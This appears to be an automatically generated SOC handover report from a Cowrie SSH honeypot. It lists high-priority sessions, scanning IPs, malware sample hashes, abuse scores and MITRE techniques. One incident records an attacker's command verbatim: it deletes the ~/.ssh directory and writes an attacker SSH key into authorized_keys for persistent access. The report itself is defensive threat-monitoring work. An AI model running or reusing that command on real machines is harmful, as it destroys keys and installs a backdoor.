### 🔴 HIGH · IR-eea1e29f2afe

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-26 22:33 |
| **Last Seen** | 2026-05-26 22:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 22:33:50` | `cowrie.session.connect` |
| `2026-05-26 22:33:50` | `cowrie.client.version` |
| `2026-05-26 22:33:50` | `cowrie.client.kex` |
| `2026-05-26 22:33:50` | `cowrie.login.success` |
| `2026-05-26 22:33:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bac28ab98cb

| Field | Detail |
|---|---|
| **Source IP** | `192.3.252[.]25` |
| **First Seen** | 2026-05-26 22:34 |
| **Last Seen** | 2026-05-26 22:36 |
| **Session Duration** | 121s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 22:34:45` | `cowrie.session.connect` |
| `2026-05-26 22:34:45` | `cowrie.client.version` |
| `2026-05-26 22:34:46` | `cowrie.client.kex` |
| `2026-05-26 22:34:46` | `cowrie.login.success` |
| `2026-05-26 22:36:46` | `cowrie.session.file_upload` |
| `2026-05-26 22:36:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.3.252[.]25` to AbuseIPDB if not already reported
- [ ] Block `192.3.252[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33ee4b86c20f

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-26 22:35 |
| **Last Seen** | 2026-05-26 22:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 22:35:25` | `cowrie.session.connect` |
| `2026-05-26 22:35:25` | `cowrie.client.version` |
| `2026-05-26 22:35:25` | `cowrie.client.kex` |
| `2026-05-26 22:35:26` | `cowrie.login.success` |
| `2026-05-26 22:35:26` | `cowrie.session.params` |
| `2026-05-26 22:35:26` | `cowrie.command.input` |
| `2026-05-26 22:35:26` | `cowrie.command.failed` |
| `2026-05-26 22:35:26` | `cowrie.log.closed` |
| `2026-05-26 22:35:27` | `cowrie.session.params` |
| `2026-05-26 22:35:27` | `cowrie.command.input` |
| `2026-05-26 22:35:27` | `cowrie.session.file_download` |
| `2026-05-26 22:35:27` | `cowrie.log.closed` |
| `2026-05-26 22:35:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6824fae2c546

| Field | Detail |
|---|---|
| **Source IP** | `118.35.127[.]66` |
| **First Seen** | 2026-05-26 22:35 |
| **Last Seen** | 2026-05-26 22:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 22:35:29` | `cowrie.session.connect` |
| `2026-05-26 22:35:29` | `cowrie.client.version` |
| `2026-05-26 22:35:29` | `cowrie.client.kex` |
| `2026-05-26 22:35:30` | `cowrie.login.success` |
| `2026-05-26 22:35:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.35.127[.]66` to AbuseIPDB if not already reported
- [ ] Block `118.35.127[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `98.158.129[.]28` | **48** | 2026-05-26 21:49 | 2026-05-26 23:12 | 28m | 0 | `T1592` | 🟠 MEDIUM |
| `118.35.127[.]66` | **17** | 2026-05-26 22:05 | 2026-05-26 22:37 | 0m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `186.148.224[.]83` | **14** | 2026-05-26 21:49 | 2026-05-26 22:10 | 0m | 14 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `1.213.196[.]20` | 1 | 2026-05-26 22:40 | 2026-05-26 22:41 | 30s | 0 | `T1592` | 🟢 LOW |
| `161.10.76[.]153` | 1 | 2026-05-26 21:49 | 2026-05-26 21:49 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.184.30[.]99` | 1 | 2026-05-26 21:50 | 2026-05-26 21:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]40` | 1 | 2026-05-26 22:37 | 2026-05-26 22:38 | 15s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `186.148.224[.]83` | AR | GRUPO IN S.A.S | **100** ⚠️ | 1 |
| `192.3.252[.]25` | US | RackNerd LLC | **100** ⚠️ | 0 |
| `98.158.129[.]28` | CA | Colosseum Online Inc. | **100** ⚠️ | 1 |
| `66.132.172[.]40` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `161.10.76[.]153` | CO | COLOMBIA TELECOMUNICACIONES S.A. ESP | **100** ⚠️ | 0 |
| `180.184.30[.]99` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 2 |
| `1.213.196[.]20` | KR | LG Uplus | **100** ⚠️ | 30 |
| `118.35.127[.]66` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `129.224.206[.]176` | SY | SpaceX Services, Inc. | **61** | 0 |
| `20.102.47[.]200` | US | Microsoft Corporation | 15 | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 51 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 32 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 17 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 9 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 8 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 15 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 102 cases |
| Tool 34  | Credential Extractor        | ✅ 49 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 10 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (2.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 10 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 17 priority case(s) shown individually · 7 recon entry/entries in table (3 group(s) consolidating 79 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-26T23:13:42Z_
